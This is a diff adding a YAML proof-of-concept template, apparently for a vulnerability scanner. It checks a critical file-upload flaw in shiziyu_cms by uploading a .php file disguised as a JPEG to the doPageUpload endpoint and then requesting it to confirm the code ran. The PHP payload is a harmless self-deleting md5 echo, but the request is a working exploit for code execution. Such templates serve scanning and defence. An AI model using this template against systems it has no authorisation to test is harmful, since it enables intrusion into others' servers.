@@ -1,0 +1,35 @@
+name: yaml-poc-shiziyu-shiziyu_cms-file_upload-CT-416538
+binding: 19bf7b61-541e-49ef-9d03-0fcf0b62b656
+detail:
+    author: system_user
+    vulnerability:
+        id: d3949260-53b5-4a48-881d-ad0f40146320
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    rboundary: randomLowercase(8)
+    randname: randomLowercase(6)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /wxapp.php?controller=Goods.doPageUpload
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"{{randname}}.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo md5({{r1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(".php"))
+        output:
+            search: '"image_o\":\"https?:\\\\/\\\\/.*?\\/(?P<path>.*?)\"".bsubmatch(response.body)'
+            path: replaceAll(search["path"], "\\", "")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /{{path}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
+expression: r0() && r1()
